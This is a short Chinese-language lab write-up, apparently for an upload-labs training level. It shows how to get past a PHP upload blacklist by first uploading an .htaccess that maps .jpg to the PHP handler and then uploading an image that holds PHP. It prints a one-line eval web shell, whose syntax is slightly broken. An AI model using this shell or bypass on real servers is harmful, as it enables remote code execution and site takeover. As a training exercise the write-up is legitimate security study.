## 解题wp(By:独立团孙德胜Alan)
本pass可以使用中间件特性绕过！ 请注意中间件版本！

## 1.打开第四关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 提示不允许上传

## 3.分析代码

![](./img/3.png)

#### 发现转换了大小写，还有常见的后缀名，以及去除了字符串等众多过滤，$img_path变量在拼接的时候用的是$file_name变量(Pass-03用的是$file_ext)。所以可以使用的上传.htaccess(没在黑名单中且未对白名单文件重命名)内容是AddType application/x-httpd-php .jpg然后再上传一个.jpg文件(含php内容)就可以把.jpg当作php解析我们可以使用中间件的特性绕过。

## 4.我们可以使用Burpsutie抓包，利用中间件的特性绕过

Apache 中间件特性，可以尝试一下后缀为.htaccess的文件。
SetHandler application/x-httpd-php

分别上传.htaccess,shell.jpg

即可绕过

